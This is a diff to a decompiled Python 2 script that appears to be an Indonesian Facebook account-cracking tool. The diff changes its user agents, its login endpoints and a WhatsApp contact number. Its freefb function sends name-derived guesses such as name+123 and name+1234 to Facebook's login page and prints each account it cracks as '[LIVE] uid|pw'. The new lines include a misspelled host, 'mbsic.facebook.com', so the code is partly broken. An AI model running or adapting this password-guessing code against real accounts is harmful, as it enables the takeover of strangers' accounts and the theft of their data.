@@ -1,6 +1,5 @@
 #!usr/bin/python2
 # Decompile by KangEhem:)
-# with (uncompyle6) version : 3.7.4
 # Time Succes decompile : 2021-12-10 20:36:32.758924
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
 from multiprocessing.pool import ThreadPool
@@ -28,12 +27,12 @@ except ImportError:
     os.system('pip2 install requests')
 reload(sys)
 sys.setdefaultencoding('utf8')
-useragents = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-uas = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-ip = requests.get('https://api.ipify.org').text
-uas = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
-api = 'https://b-api.facebook.com/method/auth.login'
+useragents = 'Mozilla/5.0 (Linux; Android 11; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36'
+ua = 'Mozilla/5.0 (Linux; Android 7.0; BLL-L22 Build/HUAWEIBLL-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/196.0.0.41.95;]'
+uas = 'Mozilla/5.0 (Linux; Android 7.0; BLL-L22 Build/HUAWEIBLL-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/196.0.0.41.95;]'
+ip = requests.get('https://mbasic.ipify.org').text
+uas = random.choice(['Mozilla/5.0 (Linux; Android 7.0; BLL-L22 Build/HUAWEIBLL-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/196.0.0.41.95;]'])
+api = 'https://mbasic.facebook.com/method/login.php'
 id = []
 cp = []
 ok = []
@@ -227,7 +226,7 @@ def laporbug():
     asulo = raw_input('\n [?] Masalah BUG : ').replace(' ', '%20')
     if asulo == '':
         menu()
-    os.system('xdg-open https://wa.me/6283185392138?text=' + asulo)
+    os.system('xdg-open https://wa.me/6281264078282?text=' + asulo)
     raw_input('\n [\xe2\x80\xa2] kembali ')
     menu()
 def infologin():
@@ -390,7 +389,7 @@ def freefb():
             pass
         try:
             for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
-                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas})
+                rex = requests.post('https://mbsic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas})
                 xo = rex.content
                 if 'free_logout_button' in xo or 'save-device' in xo:
                     print '\r\x1b[1;92m  [LIVE] ' + uid + '|' + pw + '                                            '
